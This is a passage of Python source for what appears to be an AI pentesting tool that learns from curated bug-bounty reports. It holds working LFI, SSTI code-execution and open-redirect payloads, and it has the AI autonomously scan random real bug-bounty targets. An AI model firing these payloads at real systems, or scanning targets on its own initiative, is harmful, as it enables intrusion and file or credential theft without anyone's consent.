                "severity_rating": "medium",
            }),
            ("lfi", "generic", {
                "title": "Path traversal to read /etc/passwd via file parameter",
                "techniques": ["double_encoding", "null_byte", "filter_bypass"],
                "payloads": [
                    "....//....//....//etc/passwd",
                    "..%252f..%252f..%252fetc/passwd",
                    "/etc/passwd%00.png",
                    "php://filter/convert.base64-encode/resource=../config.php",
                    "/proc/self/environ",
                ],
                "indicators": ["file", "path", "template", "page", "include", "doc", "pdf"],
                "severity_rating": "high",
            }),
            ("ssti", "generic", {
                "title": "SSTI in email template leads to RCE",
                "techniques": ["jinja2_rce", "twig_rce", "freemarker_rce"],
                "payloads": [
                    "{{7*7}}",
                    "${7*7}",
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
                ],
                "indicators": ["template", "email", "render", "name", "greeting"],
                "severity_rating": "critical",
            }),
            ("open_redirect", "generic", {
                "title": "Open redirect via returnUrl parameter bypassing domain check",
                "techniques": ["url_parser_confusion", "backslash_bypass", "fragment_bypass"],
                "payloads": [
                    "//evil.com",
                    "/\\evil.com",
                    "https://legit.com@evil.com",
                    "https://evil.com#@legit.com",
                    "https://evil.com%23@legit.com",
                    "////evil.com",
                    "https://legit.com.evil.com",
                ],
                "indicators": ["return", "redirect", "url", "next", "continue", "goto", "dest"],
                "severity_rating": "medium",
            }),
        ]

        for vuln_type, tech, data in reports:
            await self._update_pattern(
                db,
                pattern_type="hacktivity_technique",
                technology=tech,
                vuln_type=vuln_type,
                data_update={
                    "source": "curated_hacktivity",
                    **data,
                },
            )
            count += 1

            # Also add payloads to effective_payload patterns
            if "payloads" in data:
                await self._update_pattern(
                    db,
                    pattern_type="effective_payload",
                    technology=tech,
                    vuln_type=vuln_type,
                    data_update={
                        "payloads": data["payloads"],
                        "payload": data["payloads"][0],
                        "techniques": data.get("techniques", []),
                        "source": "hacktivity_curated",
                        "severity": data.get("severity_rating", "medium"),
                    },
                )

        return count

    def _extract_techniques_from_title(self, title: str) -> list[str]:
        """Extract attack techniques mentioned in report title."""
        techniques = []
        title_lower = title.lower()
        tech_keywords = {
            "union": "union_based", "blind": "blind_injection",
            "time-based": "time_based", "boolean": "boolean_based",
            "error-based": "error_based", "stored": "stored_injection",
            "reflected": "reflected_injection", "dom": "dom_based",
            "race": "race_condition", "idor": "idor",
            "ssrf": "ssrf", "rce": "remote_code_execution",
            "lfi": "local_file_inclusion", "rfi": "remote_file_inclusion",
            "deserialization": "deserialization", "xxe": "xxe",
            "jwt": "jwt_attack", "oauth": "oauth_abuse",
            "cors": "cors_bypass", "csp": "csp_bypass",
            "waf": "waf_bypass", "bypass": "filter_bypass",
            "upload": "file_upload", "prototype": "prototype_pollution",
            "template": "template_injection", "ssti": "template_injection",
            "subdomain takeover": "subdomain_takeover",
            "account takeover": "account_takeover",
            "privilege escalation": "privilege_escalation",
            "mass assignment": "mass_assignment",
            "graphql": "graphql_abuse",
            "websocket": "websocket_attack",
            "cache": "cache_poisoning",
            "request smuggling": "request_smuggling",
        }
        for keyword, technique in tech_keywords.items():
            if keyword in title_lower:
                techniques.append(technique)
        return techniques

    # ---- Phase 7: Bug Bounty Live Scanning ----

    async def _learn_from_bounty_scan(self, db: AsyncSession) -> dict:
        """
        Run a REAL scan on a random bug bounty target.
        The AI pipeline decides what to check — full autonomy.
        Results are automatically saved to DB and feed back into training.
        """
        from app.core.bounty_scanner import run_bounty_training_scan

        try:
            result = await run_bounty_training_scan(db)

            domain = result.get("domain", "")
            vulns = result.get("vulns_found", 0)
            endpoints = result.get("endpoints_found", 0)

            self.stats["bounty_scan_learned"] += vulns + endpoints

            # Save scan result as knowledge pattern
            await self._update_pattern(
                db,
                pattern_type="bounty_scan_result",
                technology="generic",
                vuln_type=None,
                data_update={
                    "source": "bounty_scan",
                    "domain": domain,
                    "program": result.get("program", ""),
                    "vulns_found": vulns,
                    "vuln_types": result.get("vuln_types", {}),
                    "endpoints_found": endpoints,
                    "subdomains_found": result.get("subdomains_found", 0),
                    "scan_id": result.get("scan_id"),
                    "real_world": True,
                },
            )

            return {"count": vulns, "domains": [domain]}

        except Exception as e:
            logger.error(f"Bounty scan learning error: {e}")
            self.stats["errors"] += 1
            return {"count": 0, "domains": []}

    # ---- Helpers ----

    async def _update_pattern(
        self, db: AsyncSession,
        pattern_type: str, technology: str, vuln_type: str | None,
        data_update: dict, confidence: float = None,
    ):
        """Find or create a knowledge pattern and update it."""
        conditions = [
            KnowledgePattern.pattern_type == pattern_type,
            KnowledgePattern.technology == technology,
        ]
        if vuln_type is not None:
            conditions.append(KnowledgePattern.vuln_type == vuln_type)

        result = await db.execute(
            select(KnowledgePattern).where(and_(*conditions)).limit(1)
        )
        existing = result.scalar_one_or_none()

        if existing:
            data = existing.pattern_data or {}
            # Merge lists (payloads, indicators)
            for key in ("payloads", "indicators"):
                if key in data_update and key in data:
                    merged = list(set(data[key] + data_update[key]))
                    data_update[key] = merged[-100:]  # cap at 100

            data.update(data_update)
            existing.pattern_data = data
            existing.sample_count += 1
            existing.updated_at = datetime.utcnow()
            if confidence is not None:
                existing.confidence = confidence
            else:
                existing.confidence = min(0.95, existing.confidence + 0.02)
            self.stats["patterns_updated"] += 1
        else:
            db.add(KnowledgePattern(
                pattern_type=pattern_type,
                technology=technology,
                vuln_type=vuln_type,
                pattern_data=data_update,
                confidence=confidence or 0.4,
                sample_count=1,
            ))
            self.stats["patterns_created"] += 1

    async def _save_training_session(self, db: AsyncSession, report: dict):
        """Save training session as a knowledge pattern for tracking."""
        db.add(KnowledgePattern(
            pattern_type="training_session",
            technology="system",
            vuln_type=None,
            pattern_data=report,
            confidence=1.0,
            sample_count=1,
        ))

    def _build_report(self, session_log: list, start: datetime) -> dict:
        """Build training session report."""
        duration = (datetime.utcnow() - start).total_seconds()
        return {
            "session_start": start.isoformat(),
            "duration_seconds": round(duration, 1),
            "phases": session_log,
            "stats": dict(self.stats),
            "completed_at": datetime.utcnow().isoformat(),
        }


# ---- Skills Report Generator ----

class SkillsReport:
    """Generates a comprehensive report of what the AI can do."""

    async def generate(self, db: AsyncSession) -> dict:
        """Generate full skills and capabilities report."""

        # 1. Overall stats
        total_patterns = (await db.execute(
            select(func.count(KnowledgePattern.id))
        )).scalar() or 0

        total_scans = (await db.execute(
            select(func.count(Scan.id)).where(Scan.status == ScanStatus.COMPLETED)
        )).scalar() or 0

        total_vulns = (await db.execute(
            select(func.count(Vulnerability.id))
        )).scalar() or 0

        total_decisions = (await db.execute(
            select(func.count(AgentDecision.id))
        )).scalar() or 0

        productive_decisions = (await db.execute(
            select(func.count(AgentDecision.id)).where(AgentDecision.was_productive == True)
        )).scalar() or 0

        # 2. Skills per vulnerability type
        skills = {}
        for vt in VulnType:
            vt_val = vt.value
            # Count patterns for this vuln type
            pattern_count = (await db.execute(
                select(func.count(KnowledgePattern.id)).where(
                    KnowledgePattern.vuln_type == vt_val
                )
            )).scalar() or 0

            # Average confidence
            avg_conf = (await db.execute(
                select(func.avg(KnowledgePattern.confidence)).where(
                    KnowledgePattern.vuln_type == vt_val
                )
            )).scalar() or 0.0

            # Count payloads
            payload_result = await db.execute(
                select(KnowledgePattern).where(
                    and_(
                        KnowledgePattern.pattern_type == "effective_payload",
                        KnowledgePattern.vuln_type == vt_val,
                    )
                )
            )
            payload_patterns = payload_result.scalars().all()
            total_payloads = sum(
                len(p.pattern_data.get("payloads", []))
                for p in payload_patterns
            )

            # Actual vulns found of this type
            found_count = (await db.execute(
                select(func.count(Vulnerability.id)).where(
                    Vulnerability.vuln_type == vt
                )
            )).scalar() or 0

            # WAF bypass knowledge
            waf_bypass_count = (await db.execute(
                select(func.count(KnowledgePattern.id)).where(
                    and_(
                        KnowledgePattern.pattern_type == "waf_bypass",
                        KnowledgePattern.vuln_type == vt_val,
                    )
                )
            )).scalar() or 0

            # Calculate skill level (0-100)
            skill_score = min(100, (
                (pattern_count * 5) +
                (total_payloads * 2) +
                (found_count * 10) +
                (waf_bypass_count * 8) +
                (avg_conf * 20)
            ))

            level = "expert" if skill_score >= 80 else \
                    "advanced" if skill_score >= 60 else \
                    "intermediate" if skill_score >= 35 else \
                    "beginner" if skill_score >= 10 else "untrained"

            skills[vt_val] = {
                "vuln_type": vt_val,
                "skill_score": round(skill_score, 1),
                "level": level,
                "patterns_count": pattern_count,
                "payloads_known": total_payloads,
                "vulns_found_total": found_count,
                "waf_bypasses": waf_bypass_count,
                "avg_confidence": round(avg_conf, 3),
            }

        # 3. Technology expertise
        tech_expertise = {}
        tech_result = await db.execute(
            select(
                KnowledgePattern.technology,
                func.count(KnowledgePattern.id),
                func.avg(KnowledgePattern.confidence),
            ).where(
                KnowledgePattern.technology.isnot(None),
                KnowledgePattern.technology != "system",
                KnowledgePattern.technology != "agent_decisions",
            ).group_by(KnowledgePattern.technology)
        )
        for tech, count, avg_conf in tech_result.all():
            expertise_score = min(100, count * 5 + (avg_conf or 0) * 30)
            tech_expertise[tech] = {
                "technology": tech,
                "patterns_count": count,
                "avg_confidence": round(avg_conf or 0, 3),
                "expertise_score": round(expertise_score, 1),
                "level": "expert" if expertise_score >= 70 else
                         "intermediate" if expertise_score >= 30 else "beginner",
            }

        # 4. Training history
        training_result = await db.execute(
            select(KnowledgePattern).where(
                KnowledgePattern.pattern_type == "training_session"
            ).order_by(KnowledgePattern.created_at.desc()).limit(10)
        )
        training_sessions = [
            {
                "date": p.created_at.isoformat() if p.created_at else None,
                "stats": p.pattern_data.get("stats", {}),
                "duration": p.pattern_data.get("duration_seconds", 0),
            }
            for p in training_result.scalars().all()
        ]

        # 5. Overall score
        all_scores = [s["skill_score"] for s in skills.values()]
        overall_score = sum(all_scores) / len(all_scores) if all_scores else 0

        overall_level = "expert" if overall_score >= 70 else \
                       "advanced" if overall_score >= 50 else \
                       "intermediate" if overall_score >= 30 else \
                       "beginner" if overall_score >= 10 else "untrained"

        # 6. Training recommendations
        recommendations = self._generate_recommendations(skills, tech_expertise, total_scans, total_patterns)

        return {
            "overall": {
                "score": round(overall_score, 1),
                "level": overall_level,
                "total_patterns": total_patterns,
                "total_scans": total_scans,
                "total_vulns_found": total_vulns,
                "total_decisions": total_decisions,
                "decision_success_rate": round(productive_decisions / total_decisions * 100, 1) if total_decisions else 0,
                "training_sessions": len(training_sessions),
            },
            "skills": skills,
            "tech_expertise": tech_expertise,
            "training_history": training_sessions,
            "recommendations": recommendations,
        }

    def _generate_recommendations(self, skills: dict, tech: dict, scans: int, patterns: int) -> list[dict]:
        """Generate actionable training recommendations."""
        recs = []

        # Sort skills by score
        sorted_skills = sorted(skills.values(), key=lambda x: x["skill_score"])

        # Weakest areas
        weakest = sorted_skills[:3]
        for s in weakest:
            if s["skill_score"] < 30:
                recs.append({
                    "priority": "high",
                    "area": s["vuln_type"],
                    "current_level": s["level"],
                    "action": f"Improve {s['vuln_type']} detection — currently {s['level']}. "
                             f"Run training mode or scan targets with known {s['vuln_type']} vulnerabilities.",
                    "expected_improvement": "Each training session adds ~10-15 patterns, "
                                          "each real scan adds ~5-20 points.",
                })

        # Not enough scans
        if scans < 5:
            recs.append({
                "priority": "high",
                "area": "experience",
                "current_level": f"{scans} scans",
                "action": "Run more scans on practice targets (DVWA, Juice Shop, WebGoat) "
                         "to build experience. Each scan teaches the AI new patterns.",
                "expected_improvement": "5+ scans significantly improves decision quality.",
            })

        # Not enough patterns
        if patterns < 50:
            recs.append({
                "priority": "high",
                "area": "knowledge_base",
                "current_level": f"{patterns} patterns",
                "action": "Run training sessions to expand the knowledge base. "
                         "Enable continuous training mode for background learning.",
                "expected_improvement": "Each training session adds 50-100+ patterns.",
            })

        # Missing technologies
        important_techs = {"php", "node", "python", "java", "wordpress"}
        known_techs = set(tech.keys())
        missing = important_techs - known_techs
        if missing:
            recs.append({
                "priority": "medium",
                "area": "technology_coverage",
                "current_level": f"Missing: {', '.join(missing)}",
                "action": f"No knowledge about {', '.join(missing)}. "
                         "Run training to learn common vulnerabilities for these technologies.",
                "expected_improvement": "Training adds 10-20 patterns per technology.",
            })

        # Strengths to maintain
        strongest = sorted_skills[-3:]
        for s in strongest:
            if s["skill_score"] >= 60:
                recs.append({
                    "priority": "info",
                    "area": s["vuln_type"],
                    "current_level": s["level"],
                    "action": f"Strong in {s['vuln_type']} ({s['level']}). "
                             "Continue scanning to maintain and improve.",
                    "expected_improvement": "Maintain current level with regular scanning.",
                })

        return recs
